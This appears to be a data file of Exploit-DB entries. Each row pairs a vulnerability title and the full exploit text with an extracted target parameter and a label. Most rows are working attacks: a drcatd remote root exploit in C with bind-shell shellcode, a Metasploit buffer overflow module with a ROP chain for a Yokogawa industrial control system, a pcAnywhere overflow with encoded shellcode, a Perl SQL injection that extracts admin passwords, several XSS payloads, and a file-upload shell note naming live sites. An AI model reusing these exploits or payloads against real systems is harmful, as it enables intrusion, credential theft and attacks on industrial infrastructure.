359,"Drcat 0.5.0-beta - 'drcatd' Remote Code Execution /*  Proof of Concept DRCATD Remote exploit                                by Taif __ Test: [root@localhost drcat]# ./drcat -d 127.0.0.1 -u taif -p test Public code by Taif drcat-0.5.0-beta ('remote r00t' proof) Bug found by Khan Shirani  host: +-+-+-+-+-+-+-+       127.0.0.1 |C|L|U|P|C|S|R| user: |O|O|S|A|O|E|O|            taif |O|G|E|S|D|N|O| password: |N|O|R|S|E|D|T|            test | | | | | | | | ---------retaddr---+-+-+-+-+-+-+-+        bfefc000 * * * * * * X        bfefbfd1 * * * * * * X        bfefbfa2 * * * * * * X        bfefbf73 * * * * * * X        bfefbf44 * * * * * * X        bfefbf15 * * * * * * X        bfefbee6 * * * * * * X        bfefbeb7 * * * * * * X        bfefbe88 * * * * * * X        bfefbe59 * * * * * * X        bfefbe2a * * * * * * X        bfefbdfb * * * * * * X        bfefbdcc * * * * * * X        bfefbd9d * * * * * * X        bfefbd6e * * * * * * X        bfefbd3f * * * * * * X        bfefbd10 * * * * * * X        bfefbce1 * * * * * * X        bfefbcb2 * * * * * * X        bfefbc83 * * * * * * X        bfefbc54 * * * * * * X        bfefbc25 * * * * * * X        bfefbbf6 * * * * * * X        bfefbbc7 * * * * * * X        bfefbb98 * * * * * * X        bfefbb69 * * * * * * X        bfefbb3a * * * * * * X        bfefbb0b * * * * * * X        bfefbadc * * * * * * X        bfefbaad * * * * * * X        bfefba7e * * * * * * X        bfefba4f * * * * * * X        bfefba20 * * * * * * X        bfefb9f1 * * * * * * X        bfefb9c2 * * * * * * X        bfefb993 * * * * * * X        bfefb964 * * * * * * X        bfefb935 * * * * * * X        bfefb906 * * * * * * X        bfefb8d7 * * * * * * X        bfefb8a8 * * * * * * X        bfefb879 * * * * * * X        bfefb84a * * * * * * X        bfefb81b * * * * * * X        bfefb7ec * * * * * * X        bfefb7bd * * * * * * X        bfefb78e * * * * * * X        bfefb75f * * * * * * X        bfefb730 * * * * * * X        bfefb701 * * * * * * X        bfefb6d2 * * * * * * X        bfefb6a3 * * * * * * X        bfefb674 * * * * * * X        bfefb645 * * * * * * X        bfefb616 * * * * * * X        bfefb5e7 * * * * * * X        bfefb5b8 * * * * * * X        bfefb589 * * * * * * X        bfefb55a * * * * * * X        bfefb52b * * * * * * X        bfefb4fc * * * * * * * * HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN * Linux localhost.localdomain 2.4.26 #9 P ?ec 2 09:20:29 CEST 2004 i686 athlon i386 GNU/Linux uid=500(taif) gid=500(taif) groups=500(taif) 10:04pm up 1:00, 1 user, load average: 0.42, 0.35, 0.20 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT ....   NOTE: Use this on your own risk!! This exploit is unnecessary!! */   #include <stdio.h> #include <netdb.h> #include <unistd.h>  #define MAXDATASIZE (1024 * 4)  /* Color Pallete ... i love colors;) */ #define YELLOW ""\E[33m"" #define GREEN ""\E[32m"" #define RED ""\E[31m"" #define RESTORE ""\E[0m""   #define PRINTGREEN(string) \        printf(""%s%s%s"",GREEN,string,RESTORE); \        fflush(stdout);  #define PRINTRED(string) \        printf(""%s%s%s"",RED,string,RESTORE); \        fflush(stdout);  #define PRINTYELLOW(string) \        printf(""%s%s%s"",YELLOW,string,RESTORE); \        fflush(stdout);  /* portbind 20000 (by bighawk) * * +setuid() */ char code[] = ""\x31\xc0"" /* xorl %eax,%eax */ ""\x31\xdb"" /* xorl %ebx,%ebx */ ""\xb0\x17"" /* movb $0x17,%al */ ""\xcd\x80"" /* int $0x80 */ ""\x31\xdb"" /* xor ebx, ebx */ ""\xf7\xe3"" /* mul ebx */ ""\xb0\x66"" /* mov al, 102 */ ""\x53"" /* push ebx */ ""\x43"" /* inc ebx */ ""\x53"" /* push ebx */ ""\x43"" /* inc ebx */ ""\x53"" /* push ebx */ ""\x89\xe1"" /* mov ecx, esp */ ""\x4b"" /* dec ebx */ ""\xcd\x80"" /* int 80h */ ""\x89\xc7"" /* mov edi, eax */ ""\x52"" /* push edx */ ""\x66\x68\x4e\x20""/* push word 8270 */ ""\x43"" /* inc ebx */ ""\x66\x53"" /* push bx */ ""\x89\xe1"" /* mov ecx, esp */ ""\xb0\xef"" /* mov al, 239 */ ""\xf6\xd0"" /* not al */ ""\x50"" /* push eax */ ""\x51"" /* push ecx */ ""\x57"" /* push edi */ ""\x89\xe1"" /* mov ecx, esp */ ""\xb0\x66"" /* mov al, 102 */ ""\xcd\x80"" /* int 80h */ ""\xb0\x66"" /* mov al, 102 */ ""\x43"" /* inc ebx */ ""\x43"" /* inc ebx */ ""\xcd\x80"" /* int 80h */ ""\x50"" /* push eax */ ""\x50"" /* push eax */ ""\x57"" /* push edi */ ""\x89\xe1"" /* mov ecx, esp */ ""\x43"" /* inc ebx */ ""\xb0\x66"" /* mov al, 102 */ ""\xcd\x80"" /* int 80h */ ""\x89\xd9"" /* mov ecx, ebx */ ""\x89\xc3"" /* mov ebx, eax */ ""\xb0\x3f"" /* mov al, 63 */ ""\x49"" /* dec ecx */ ""\xcd\x80"" /* int 80h */ ""\x41"" /* inc ecx */ ""\xe2\xf8"" /* loop lp */ ""\x51"" /* push ecx */ ""\x68\x6e\x2f\x73\x68""/* push dword 68732f6eh */ ""\x68\x2f\x2f\x62\x69""/* push dword 69622f2fh */ ""\x89\xe3"" /* mov ebx, esp */ ""\x51"" /* push ecx */ ""\x53"" /* push ebx */ ""\x89\xe1"" /* mov ecx, esp */ ""\xb0\xf4"" /* mov al, 244 */ ""\xf6\xd0"" /* not al */ ""\xcd\x80""; /* int 80h */  void banner() { fprintf(stderr,""Public code by Taif \n""               ""drcat-0.5.0-beta (\'remote r00t\' proof)\n""               ""Bug found by Khan Shirani \n\n""); }  void usage (char *progname) { int i; fprintf (stderr, ""usage: %s arguments \n\n""                 ""-d hostanme (127.0.0.1) \n""                 ""-u user (NULL) \n""                 ""-p password (NULL) \n""                 ""-P port (3535) \n""                 ""-t timeout (1000=1s) (300) \n""                 ""\n"", progname);   exit (0); }  int conn(char *ip,int port) { int sock; struct hostent *host; struct sockaddr_in addr;  if((host=gethostbyname(ip))==NULL)  { PRINTRED(""X\ngethostbyname()\n""); exit(1); }  addr.sin_family=AF_INET; addr.sin_port=htons(port); addr.sin_addr=*((struct in_addr *)host->h_addr); memset(&(addr.sin_zero),0,8);   if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)  { PRINTRED(""X\nsocket()\n""); exit(1); }  if(connect(sock,(struct sockaddr *)&addr,sizeof(struct sockaddr))==-1)  { PRINTRED(""X\n""); return(-1);}  return(sock); }  void login(int sock,char* user,char *pass) { char buffer[1024]; int n;  memset(buffer,0,sizeof(buffer)); n=recv(sock, buffer, 6, 0); if(n<0) { PRINTRED(""\nrecv()\n""); exit(1); } if(n==6)  {  if(strcmp(buffer, ""drcatd"")) {PRINTYELLOW(""* "");}    else {PRINTGREEN(""* "");};  } else {PRINTYELLOW(""* "");}  if(send(sock, user, strlen(user), 0) == -1)  {PRINTRED(""\nsend()\n"");close(sock);exit(1);}  n=recv(sock, buffer, 1, 0); if(buffer[0] == '0')  {  PRINTRED(""X\nINVALID USER\n"");  close(sock);  exit(1);  } else {PRINTGREEN(""* "")};  if(send(sock, pass, strlen(pass), 0) == -1)  {PRINTRED(""send()\n"");close(sock);exit(1);}  n=recv(sock, buffer, 1, 0);  if(buffer[0] == '0')  {  PRINTRED(""X\nINVALID PASSWORD\n"");  close(sock);  exit(1);  } return; }  /* change with care */ #define TOP 290  void makec0de(char* haox,unsigned int ret) { int i;  memset(haox,0,512); memset(haox,0x90,TOP); for (i=0;i<sizeof(code)-1;i++) haox[TOP-sizeof(code)+i]=code[i]; /* yeah fucking thing (ret%4) */ for (i=TOP-(ret%4);i<504;i=i+4) *(long *)&haox[i]=ret; }  void send_it(int sock,char* buffer) { int len;  len=strlen(buffer); if (send(sock, buffer, len, 0) == -1)  {  PRINTRED(""X\nsend()\n"");  close(sock);  exit(1);  } return; }  int sh(int sock) { char snd[1024], rcv[1024]; fd_set rset; int maxfd, n; int received = 0;  //strcpy(snd,""TERM=xterm; export TERM=xterm; exec bash -i\n""); //write(sock, snd, strlen(snd));  strcpy(snd, ""uname -a; id; w\n""); write(sock, snd, strlen(snd));  for (;;) { FD_SET(fileno(stdin), &rset); FD_SET(sock, &rset);  maxfd = ( ( fileno(stdin) > sock )?fileno(stdin):sock ) + 1; select(maxfd, &rset, NULL, NULL, NULL);  if (FD_ISSET(fileno(stdin), &rset))  {  bzero(snd, sizeof(snd));  fgets(snd, sizeof(snd)-2, stdin);  write(sock, snd, strlen(snd));  }  if (FD_ISSET(sock, &rset))  {  bzero(rcv, sizeof(rcv));  if ((n = read(sock, rcv, sizeof(rcv))) == -1)    {    printf(""FUCK: Error in read\n"");    exit(1);    }  if (!n)    {    if (!received)      {      printf(""FUCK: failed.\n\n"");      return 0;      }    printf(""Connection closed.\n"");    exit(1);    }   received = 1;  fputs(rcv, stdout);  fflush(stdout);  } } }  int main(int argc, char *argv[]){ char buff[MAXDATASIZE]; char *host, *user,*pass,c; int sockfd,sockfd2; int port = 3535; int time = 300; int ret=0xc0000000-(MAXDATASIZE*260);  host=""127.0.0.1""; user=NULL; pass=NULL;  banner(); if (argc<2) usage (argv[0]);  while((c=getopt(argc,argv,""?hd:u:p:P:t:""))!=-1)        {                switch(c)                {                case 't':                                time=atoi(optarg);                                break;                case 'P':                                port=atoi(optarg);                                break;                case 'u':                                user=optarg;                                break;                case 'd':                                host=optarg;                                break;                case 'p':                                pass=optarg;                                break;                case '?':                case 'h':                default:                                usage (argv[0]);                                break;                 }        }  if (host==NULL)  {PRINTRED(""Set host!\n"");usage (argv[0]);} if (user==NULL)  {PRINTRED(""Set user!\n"");usage (argv[0]);} if (pass==NULL)  {PRINTRED(""Set password!\n"");usage (argv[0]);}   printf("" host: +-+-+-+-+-+-+-+\n""       ""%16s |C|L|U|P|C|S|R|\n""       "" user: |O|O|S|A|O|E|O|\n""       ""%16s |O|G|E|S|D|N|O|\n""       "" password: |N|O|R|S|E|D|T|\n""       ""%16s | | | | | | | |\n""       ""---------retaddr---+-+-+-+-+-+-+-+\n""       ,host,user,pass);fflush(stdout); while(1) { printf(""%16x "",ret);fflush(stdout); sockfd=conn(host,port); if (sockfd<0) {PRINTRED(""connect()\n"");exit(1);}  else PRINTGREEN(""* ""); login(sockfd,user,pass);PRINTGREEN(""* ""); makec0de(buff,ret);PRINTGREEN(""* ""); send_it(sockfd,buff);PRINTGREEN(""* ""); close(sockfd); usleep(time*1000); sockfd=conn(host,20000); if (!(sockfd<0))  {  PRINTGREEN(""*\n"");  PRINTGREEN(""* HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN * HAVE FUN *\n"");  sh(sockfd);  close(sockfd);  exit(0);  } ret=ret-((TOP-sizeof(code))/4); } exit(0);  }  // milw0rm.com [2004-07-22]","[""'drcatd'""]",1
16955,"SmarterMail 7.3/7.4 - Multiple Vulnerabilities Author: Hoyt LLC Research | http://xss.cx | http://cloudscan.me Identified: October 28, 2010  Vendor: SmarterTools Application: SmarterMail 7.x Bug(s): Stored XSS, Reflected XSS, Directory Traversal, File Upload Parameters, OS Execution, XML Injection, LDAP Injection, DoS  Patch: The Vendor has released SmarterMail Version 8 at URI http://www.smartertools.com/Download.aspx?Product=SmarterMail&File=Installer&Version=8&Location=Primary  Timeline: Notify Vendor 10-28-2011 on Version 7.3 with respect to Stored XSS, other Vulns               Vendor updates to Version 7.4 on 12.30.2010, Notify Vendor of Stored XSS, other Vulns               Vendor updates to Version 8.0 on 3.10.2011  Publication: March 10, 2011 | Hoyt LLC Research publishes vulnerability information for SmarterMail Version 7.3 and 7.4, building on Version 7.1 and 7.2 exploits known as CVE-2010-3486 and CVE-2010-3425 at URI http://www.cloudscan.me/2011/03/smartermail-73-74-full-disclosure-xss.html.  Hoyt LLC Research | March 10, 2011  SmarterMail Versions 7.x | CWE-79: The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. Stored XSS - CWE-79, CAPEC-86 - SmarterMail Version 7.x Series Summary  Severity:  	High Confidence:  	Certain Host:  	http://SmarterMail 7.x.Hosts Path:  	/Main/frmPopupContactsList.aspx Issue detail - Confirmed in Versions 7.1, 7.2, 7.3 and 7.4  The value of the ctl00%24MPH%24wucContactInfo%24txtEmailAddress_SettingText request parameter submitted to the URL /Main/frmContact.aspx is copied into the HTML document as plain text between tags at the URL /Main/frmPopupContactsList.aspx. The payload 9e8e5<script>alert(1)</script>5b211c9e81 was submitted in the ctl00%24MPH%24wucContactInfo%24txtEmailAddress_SettingText parameter. This input was returned unmodified in a subsequent request for the URL /Main/frmPopupContactsList.aspx.  Full Disclsoure - SmarterMail 7.x - Blog Posts http://www.cloudscan.me/2011/03/smartermail-73-74-full-disclosure-xss.html http://www.cloudscan.me/2010/09/smartermail-7x-713876-bugs-cross-site.html http://www.cloudscan.me/2010/09/smarter-mail-7x-713876-file-fuzzing.html http://www.cloudscan.me/2010/10/vendor-smartertoolscom-smartermail-7x_07.html http://www.cloudscan.me/2010/10/vendor-smartertoolscom-smartermail-7x.html http://www.cloudscan.me/2010/10/smartermail-7x-723925.html  Full Disclosure- SmarterMail 7.x - Burp Suite Pro 1.3.08 + Netsparker Audit Reports, HTML, XML Files, Screen Grabs. http://xss.cx/examples/sm_7.2.3925_interim_report_1.htm http://xss.cx/examples/sm_7.2.3925_interim_report_2.htm http://xss.cx/examples/smartermail-7.2-report-interim-3.html http://xss.cx/examples/sm-72-target.html http://xss.cx/examples/sm_7.2.3925_stored_xss_audit_example.html http://xss.cx/examples/sm_7.2.3925_file2_burp_1.3.08.html",['frmContact.aspx '],1
33331,"Yokogawa CS3000 - 'BKESimmgr.exe' Remote Buffer Overflow (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::Tcp    def initialize(info = {})     super(update_info(info,       'Name'           => 'Yokogawa CS3000 BKESimmgr.exe Buffer Overflow',       'Description'    => %q{         This module exploits an stack based buffer overflow on Yokogawa CS3000. The vulnerability         exists in the BKESimmgr.exe service when handling specially crafted packets, due to an         insecure usage of memcpy, using attacker controlled data as the size count. This module         has been tested successfully in Yokogawa CS3000 R3.08.50 over Windows XP SP3 and Windows         2003 SP2.       },       'Author'         =>         [           'juan vazquez',           'Redsadic <julian.vilas[at]gmail.com>'         ],       'References'     =>         [           ['CVE', '2014-0782'],           ['URL', 'https://community.rapid7.com/community/metasploit/blog/2014/05/09/r7-2013-192-disclosure-yokogawa-centum-cs-3000-vulnerabilities'],           ['URL', 'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf']         ],       'Payload'        =>         {           'Space'          => 340,           'DisableNops'    => true,           'PrependEncoder' => ""\x81\xc4\x54\xf2\xff\xff"" # Stack adjustment # add esp, -3500         },       'Platform'       => 'win',       'Targets'        =>         [           [             'Yokogawa Centum CS3000 R3.08.50 / Windows [ XP SP3 / 2003 SP2 ]',             {               'Ret'           => 0x61d1274f, # 0x61d1274f # ADD ESP,10 # RETN # libbkebatchepa.dll               'Offset'        => 64,               'FakeArgument1' => 0x0040E65C, # ptr to .data on BKESimmgr.exe               'FakeArgument2' => 0x0040EB90  # ptr to .data on BKESimmgr.exe             }           ],         ],       'DisclosureDate' => 'Mar 10 2014',       'DefaultTarget'  => 0))      register_options(       [         Opt::RPORT(34205)       ], self.class)   end    def check     data = create_pkt(rand_text_alpha(4))      res = send_pkt(data)      if res && res.length == 10       simmgr_res = parse_response(res)        if valid_response?(simmgr_res)         check_code = Exploit::CheckCode::Appears       else         check_code = Exploit::CheckCode::Safe       end     else       check_code = Exploit::CheckCode::Safe     end      check_code   end    def exploit     bof = rand_text(target['Offset'])     bof << [target.ret].pack(""V"")     bof << [target['FakeArgument1']].pack(""V"")     bof << [target['FakeArgument2']].pack(""V"")     bof << rand_text(16)  # padding (corrupted bytes)     bof << create_rop_chain     bof << payload.encoded      data = [0x1].pack(""N"")         # Sub-operation id, <= 0x8 in order to pass the check at sub_4090B0     data << [bof.length].pack(""n"")     data << bof      pkt = create_pkt(data)      print_status(""Trying target #{target.name}, sending #{pkt.length} bytes..."")     connect     sock.put(pkt)     disconnect   end    def create_rop_chain     # rop chain generated with mona.py - www.corelan.be     rop_gadgets =       [         0x004047ca, # POP ECX # RETN [BKESimmgr.exe]         0x610e3024, # ptr to &VirtualAlloc() [IAT libbkfmtvrecinfo.dll]         0x61232d60, # MOV EAX,DWORD PTR DS:[ECX] # RETN [LibBKESysVWinList.dll]         0x61d19e6a, # XCHG EAX,ESI # RETN [libbkebatchepa.dll]         0x619436d3, # POP EBP # RETN [libbkeeda.dll]         0x61615424, # & push esp #  ret  [libbkeldc.dll]         0x61e56c8e, # POP EBX # RETN [LibBKCCommon.dll]         0x00000001, # 0x00000001-> ebx         0x61910021, # POP EDX # ADD AL,0 # MOV EAX,6191002A # RETN [libbkeeda.dll]         0x00001000, # 0x00001000-> edx         0x0040765a, # POP ECX # RETN [BKESimmgr.exe]         0x00000040, # 0x00000040-> ecx         0x6191aaab, # POP EDI # RETN [libbkeeda.dll]         0x61e58e04, # RETN (ROP NOP) [LibBKCCommon.dll]         0x00405ffa, # POP EAX # RETN [BKESimmgr.exe]         0x90909090, # nop         0x619532eb  # PUSHAD # RETN [libbkeeda.dll]       ].pack(""V*"")      rop_gadgets   end    def create_pkt(data)     pkt = [0x01].pack(""N"")         # Operation Identifier     pkt << [data.length].pack(""n"") # length     pkt << data                    # Fake packet      pkt   end    def send_pkt(data)     connect     sock.put(data)     res = sock.get_once     disconnect      res   end    def parse_response(data)     data.unpack(""NnN"")   end    def valid_response?(data)     valid = false      if data && data[0] == 1 && data[1] == 4 && data[1] == 4 && data[2] == 5       valid = true     end      valid   end  end","[""'BKESimmgr.exe'""]",1
28413,cPanel 10.x - 'dohtaccess.html?dir' Cross-Site Scripting source: https://www.securityfocus.com/bid/19624/info  cPanel is prone to multiple cross-site scripting vulnerabilities. These issues are due to a lack of proper sanitization of user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/frontend/x/htaccess/dohtaccess.html?dir=[code],"[""'dohtaccess.html?dir'""]",1
15327,"Energine CMS - SQL Injection Vulnerability ID: HTB22655 Reference: http://www.htbridge.ch/advisory/sql_injection_in_energine.html Product: Energine  Vendor: Energine  ( http://energine.org/ )  Vulnerable Version:  Vendor Notification: 13 October 2010  Vulnerability Type: SQL Injection Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response Risk level: High  Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)   Vulnerability Details: The vulnerability exists due to failure in the ""/index.php"" script to properly sanitize user-supplied input in NRGNSID variable from cookie. Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.  The following PoC is available:   Cookie: NRGNSID='SQL_CODE_HERE","['index.php""']",1
34916,IBM Tivoli Access Manager for E-Business - '/ibm/wpm/user?method' Cross-Site Scripting source: https://www.securityfocus.com/bid/44382/info           IBM Tivoli Access Manager for e-business is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.           An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.           IBM Tivoli Access Manager for e-business 6.1.0 is vulnerable  http://www.example.com/ibm/wpm/user?method=props%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E,"[""'/ibm/wpm/user?method'""]",1
19407,"Symantec pcAnywhere 12.5.0 - 'Login' / 'Password' Remote Buffer Overflow #!/usr/bin/python  # Exploit Title: Symantec PcAnywhere login and password field buffer overflow # Date: 2012.06.27 # Author: S2 Crew [Hungary] # Software Link: symantec.com # Version: 12.5.0 # Tested on: Windows XP SP2 # CVE: CVE-2011-3478    #EDB Note: Needs adjustment but there is a crash  # Code : import socket import time import struct import string import sys  shell = ( ""\xda\xda\xbb\x9e\x7f\xfb\x04\xd9\x74\x24\xf4\x58\x2b\xc9"" ""\xb1\x56\x31\x58\x18\x03\x58\x18\x83\xc0\x9a\x9d\x0e\xf8"" ""\x4a\xe8\xf1\x01\x8a\x8b\x78\xe4\xbb\x99\x1f\x6c\xe9\x2d"" ""\x6b\x20\x01\xc5\x39\xd1\x92\xab\x95\xd6\x13\x01\xc0\xd9"" ""\xa4\xa7\xcc\xb6\x66\xa9\xb0\xc4\xba\x09\x88\x06\xcf\x48"" ""\xcd\x7b\x3f\x18\x86\xf0\xed\x8d\xa3\x45\x2d\xaf\x63\xc2"" ""\x0d\xd7\x06\x15\xf9\x6d\x08\x46\x51\xf9\x42\x7e\xda\xa5"" ""\x72\x7f\x0f\xb6\x4f\x36\x24\x0d\x3b\xc9\xec\x5f\xc4\xfb"" ""\xd0\x0c\xfb\x33\xdd\x4d\x3b\xf3\x3d\x38\x37\x07\xc0\x3b"" ""\x8c\x75\x1e\xc9\x11\xdd\xd5\x69\xf2\xdf\x3a\xef\x71\xd3"" ""\xf7\x7b\xdd\xf0\x06\xaf\x55\x0c\x83\x4e\xba\x84\xd7\x74"" ""\x1e\xcc\x8c\x15\x07\xa8\x63\x29\x57\x14\xdc\x8f\x13\xb7"" ""\x09\xa9\x79\xd0\xfe\x84\x81\x20\x68\x9e\xf2\x12\x37\x34"" ""\x9d\x1e\xb0\x92\x5a\x60\xeb\x63\xf4\x9f\x13\x94\xdc\x5b"" ""\x47\xc4\x76\x4d\xe7\x8f\x86\x72\x32\x1f\xd7\xdc\xec\xe0"" ""\x87\x9c\x5c\x89\xcd\x12\x83\xa9\xed\xf8\xb2\xed\x23\xd8"" ""\x97\x99\x41\xde\x06\x06\xcf\x38\x42\xa6\x99\x93\xfa\x04"" ""\xfe\x2b\x9d\x77\xd4\x07\x36\xe0\x60\x4e\x80\x0f\x71\x44"" ""\xa3\xbc\xd9\x0f\x37\xaf\xdd\x2e\x48\xfa\x75\x38\x71\x6d"" ""\x0f\x54\x30\x0f\x10\x7d\xa2\xac\x83\x1a\x32\xba\xbf\xb4"" ""\x65\xeb\x0e\xcd\xe3\x01\x28\x67\x11\xd8\xac\x40\x91\x07"" ""\x0d\x4e\x18\xc5\x29\x74\x0a\x13\xb1\x30\x7e\xcb\xe4\xee"" ""\x28\xad\x5e\x41\x82\x67\x0c\x0b\x42\xf1\x7e\x8c\x14\xfe"" ""\xaa\x7a\xf8\x4f\x03\x3b\x07\x7f\xc3\xcb\x70\x9d\x73\x33"" ""\xab\x25\x83\x7e\xf1\x0c\x0c\x27\x60\x0d\x51\xd8\x5f\x52"" ""\x6c\x5b\x55\x2b\x8b\x43\x1c\x2e\xd7\xc3\xcd\x42\x48\xa6"" ""\xf1\xf1\x69\xe3"" ) init1 = ( ""\x00\x00\x00\x00"" # kezdeti handshake )  init2 = ( ""\x0d\x06\xfe"" # Enter username uzenet koveti (NTdialog) )  init3 = ( ""A"" * 100 #+ ""\r"" #username )  readable_xp_sp2 = struct.pack('<L',0x023E5AD0) call_esi = struct.pack('<L',0x67f7aac4) jmp = struct.pack('<L',0x414112EB)  init4 = ( ""B"" * 1282 + jmp + readable_xp_sp2 + ""DDDD"" +call_esi + ""AAAA"" + shell + ""E"" * (4000 - 1286 - 12 - len(shell)) )  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect=s.connect(('172.16.29.133',5631)) # hardcoded IP address  print ""init packet..."" s.send(init1) # send the data time.sleep(5) data = s.recv(1024)  print ""handshake packet..."" s.send(init2) # send the data time.sleep(5) data = s.recv(1024)  print ""username packet..."" s.send(init3) # send the data time.sleep(5) #data = s.recv(1024)  print ""password packet..."" s.send(init4) # send the data s.close()","[""'Password'"", 'password field']",1
3141,"MGB 0.5.4.5 - 'email.php?id' SQL Injection #!/usr/bin/perl # ########################################################## # MGB <= 0.5.4.5 Exploit # Vulnerability found by SlimTim10 # Created By: SlimTim10 # <slimtim10@gmail.com> ########################################################## # Google dork: # ( intext:mgb.0.5.. & intext:mopzz ) | intext:mgb.0.5.4.. ##########################################################   use IO::Socket::INET;  usage() unless (@ARGV == 2);  $host = $ARGV[0]; $dir = $ARGV[1];  $dir = ""\/$dir"" if ($dir !~ /^\//); $dir = ""$dir\/"" if ($dir !~ /\/$/); $host =~ s/http:\/\///g;  $path = $dir.'email.php?id=1%20UNION%20SELECT%20null,passwort%20FROM%20mgb_settings%20--'; $socket = IO::Socket::INET->new( Proto => ""tcp"", 								 PeerAddr => ""$host"", 								 PeerPort => ""80"") 								 || die ""[-]Connect Failed: could not connect to $host\n"";  print ""[+]Connecting...\n""; print $socket ""GET $path HTTP/1.1\n""; print $socket ""Host: $host\n""; print $socket ""Accept: */*\n""; print $socket ""Connection: close\n\n""; print ""[+]Connected!\n"";  while ($answer = <$socket>) {   $answer =~ m/Email an&nbsp;(.*?)&nbsp;schreiben/ and $var = $1; }  if ($var !~ /[\da-f]{32,32}/) { 	print ""[-]Exploit failed.""; 	exit(0); }  print ""[+]Admin Password: $var\n""; print ""[+]Admin Link: http://$host"".$dir.""admin.php?sid=$var\n"";  sub usage {     print ""\n"" . ""=|=-"" x 14 . ""=|="";     print q( ]                                                         [ [       MGB <= 0.5.4.5 Remote SQL Injection Exploit       ] [                Tested on MGB <= 0.5.4.5                 ] [       Created by: SlimTim10 <slimtim10@gmail.com>       ] ]                                                         [ );     print ""=|=-"" x 14 . ""=|=\n\n"";     print ""\tUsage: $0 [HOST] [PATH]\n"";     print ""\tEx: $0 www.host.com /guestbook/\n"";     print ""\tEx: $0 host.com mgb"";     print ""\n\n"".""`^"" x 29 . ""`\n"";     exit(0); }  # milw0rm.com [2007-01-17]","[""'email.php?id'""]",1
34497,"ViArt Helpdesk - 'reviews.php?category_id' Cross-Site Scripting source: https://www.securityfocus.com/bid/42543/info     ViArt Helpdesk is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.     An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.     httpwww.example.com/helpdesk-demo/reviews.php?category_id=1>""><ScRiPt %0D%0A>alert(414577246752)%3B</ScRiPt>","[""'reviews.php?category_id'""]",1
8132,"Access2asp - 'imageLibrar' Arbitrary File Upload                          ||          ||   | ||                            o_,_7 _||  . _o_7 _|| 4_|_||  o_w_,                   ( :   /    (_)    /           (   .     ################################################################ #           upload shell # #           Found by ::: mr.al7rbi # #           Contact  ::: n16 [at] live.com # #           my Group ::: islam-defenders Team # ################################################################   [+] Title: imageLibrary   [dork]  inurl:""default_Image.asp""  [+] EXPLOITS:  http://www.site.com/imageLibrary//admin/images/default_Image.asp  [exp:]    http://www.davidhalpernmd.com/manage_tbps/default_Image.asp  [demo]  ]http://www.access2asp.com/imageLibraryDemo/admin/images/default_Image.asp  [shell be like ]  http://www.access2asp.com/imageLibraryDemo/admin/images/win.asp   [+] Special  Greetz for :  www.sec-code.com  [+] Greetz : MaTrEx  & samkmk.almkkar & 3lo0osh  &  ili The General ili & Super-Code & BxH &all tryag members & all muslims  # milw0rm.com [2009-03-02]","[""'imageLibrar'""]",1
